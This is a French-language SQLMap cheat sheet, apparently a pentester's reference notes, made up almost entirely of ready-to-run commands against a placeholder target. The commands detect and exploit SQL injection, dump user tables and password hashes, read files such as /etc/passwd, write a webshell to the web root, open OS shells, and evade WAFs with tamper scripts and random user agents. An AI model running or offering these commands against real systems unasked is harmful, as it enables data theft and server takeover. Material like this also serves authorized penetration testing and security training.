# SQLMap

Outil automatique de détection et d'exploitation d'injections SQL. Supporte MySQL, MSSQL, PostgreSQL, Oracle, SQLite et bien d'autres.

## Syntaxe de base

```bash
sqlmap -u "https://cible.com/page.php?id=1"
```

## Détection

### GET

```bash
# Tester un paramètre GET
sqlmap -u "https://cible.com/page.php?id=1"

# Spécifier le paramètre à tester
sqlmap -u "https://cible.com/page.php?id=1&cat=2" -p id
```

### POST

```bash
# Données POST
sqlmap -u "https://cible.com/login.php" --data="user=admin&pass=test"

# Spécifier le paramètre
sqlmap -u "https://cible.com/login.php" --data="user=admin&pass=test" -p user
```

### Depuis Burp Suite

```bash
# Sauvegarder la requête depuis Burp (clic droit → Save item)
sqlmap -r requete.txt
```

### Avec cookies / headers

```bash
# Cookie d'authentification
sqlmap -u "https://cible.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Header custom
sqlmap -u "https://cible.com/page.php?id=1" -H "Authorization: Bearer TOKEN"

# Tester un cookie vulnérable
sqlmap -u "https://cible.com/" --cookie="id=1*" --level=2
```

## Enumération

### Bases de données

```bash
# Lister les bases
sqlmap -u "https://cible.com/page.php?id=1" --dbs

# Tables d'une base
sqlmap -u "https://cible.com/page.php?id=1" -D mabase --tables

# Colonnes d'une table
sqlmap -u "https://cible.com/page.php?id=1" -D mabase -T users --columns

# Dumper une table
sqlmap -u "https://cible.com/page.php?id=1" -D mabase -T users --dump

# Dumper des colonnes spécifiques
sqlmap -u "https://cible.com/page.php?id=1" -D mabase -T users -C username,password --dump

# Tout dumper
sqlmap -u "https://cible.com/page.php?id=1" -D mabase --dump-all
```

### Informations système

```bash
# Version du SGBD
sqlmap -u "https://cible.com/page.php?id=1" -b

# Utilisateur courant
sqlmap -u "https://cible.com/page.php?id=1" --current-user

# Base courante
sqlmap -u "https://cible.com/page.php?id=1" --current-db

# Est-on DBA ?
sqlmap -u "https://cible.com/page.php?id=1" --is-dba

# Hashes des utilisateurs DB
sqlmap -u "https://cible.com/page.php?id=1" --passwords
```

## Exploitation avancée

### Lire un fichier

```bash
sqlmap -u "https://cible.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "https://cible.com/page.php?id=1" --file-read="C:\windows\win.ini"
```

### Écrire un fichier (webshell)

```bash
sqlmap -u "https://cible.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Shell OS

```bash
# Shell interactif
sqlmap -u "https://cible.com/page.php?id=1" --os-shell

# Commande unique
sqlmap -u "https://cible.com/page.php?id=1" --os-cmd="whoami"

# Shell SQL interactif
sqlmap -u "https://cible.com/page.php?id=1" --sql-shell
```

## Techniques d'injection (--technique)

```bash
# Spécifier les techniques à utiliser
sqlmap -u "URL" --technique=U         # Union uniquement
sqlmap -u "URL" --technique=B         # Boolean blind uniquement
sqlmap -u "URL" --technique=T         # Time-based uniquement
sqlmap -u "URL" --technique=E         # Error-based uniquement
sqlmap -u "URL" --technique=BEUST     # Toutes (par défaut)
```

| Lettre | Technique |
|--------|-----------|
| B | Boolean-based blind |
| E | Error-based |
| U | Union query-based |
| S | Stacked queries |
| T | Time-based blind |

## Niveaux et risques

```bash
# Level (1-5) : plus c'est haut, plus de payloads testés
sqlmap -u "URL" --level=3

# Risk (1-3) : plus c'est haut, plus de payloads "dangereux"
sqlmap -u "URL" --risk=3

# Level 3 + Risk 3 pour un scan complet
sqlmap -u "URL" --level=3 --risk=3
```

| Level | Ce qui est testé en plus |
|-------|-------------------------|
| 1 | GET/POST basiques |
| 2 | Cookies |
| 3 | User-Agent, Referer |
| 4 | Headers custom |
| 5 | Paramètres host |

## Contournement de WAF

```bash
# Tamper scripts — modifier les payloads pour bypass le WAF
sqlmap -u "URL" --tamper=space2comment
sqlmap -u "URL" --tamper=between
sqlmap -u "URL" --tamper=randomcase
sqlmap -u "URL" --tamper=charencode

# Combiner plusieurs tampers
sqlmap -u "URL" --tamper="space2comment,randomcase,between"

# Random User-Agent
sqlmap -u "URL" --random-agent

# Délai entre les requêtes (éviter le rate limiting)
sqlmap -u "URL" --delay=2

# Threads (accélérer, mais plus bruyant)
sqlmap -u "URL" --threads=5
```

### Tamper scripts utiles

| Script | Effet |
|--------|-------|
| `space2comment` | Remplace les espaces par `/**/` |
| `between` | Remplace `>` par `NOT BETWEEN 0 AND` |
| `randomcase` | Mélange majuscules/minuscules |
| `charencode` | Encode en URL les caractères |
| `equaltolike` | Remplace `=` par `LIKE` |
| `base64encode` | Encode le payload en base64 |
| `space2plus` | Remplace les espaces par `+` |

```bash
# Lister tous les tamper scripts disponibles
sqlmap --list-tampers
```

## Options utiles

```bash
# Mode batch (pas de questions interactives)
sqlmap -u "URL" --batch

# Proxy (passer par Burp)
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Forcer le SGBD
sqlmap -u "URL" --dbms=mysql

# Suffixe/préfixe custom
sqlmap -u "URL" --prefix="'" --suffix="-- -"

# Verbose
sqlmap -u "URL" -v 3

# Sauvegarder la session (reprendre plus tard)
sqlmap -u "URL" --output-dir=/tmp/sqlmap_output

# Relancer avec le cache
sqlmap -u "URL" --flush-session    # Ignorer le cache
```

## Combos courants

```bash
# Scan rapide
sqlmap -u "URL" --batch --dbs

# Scan complet avec bypass WAF
sqlmap -u "URL" --level=3 --risk=3 --random-agent --tamper=space2comment,randomcase --batch

# Depuis une requête Burp
sqlmap -r requete.txt --batch --dbs

# Dump complet d'une table
sqlmap -u "URL" -D db -T users --dump --batch

# Obtenir un shell
sqlmap -u "URL" --os-shell --batch
```
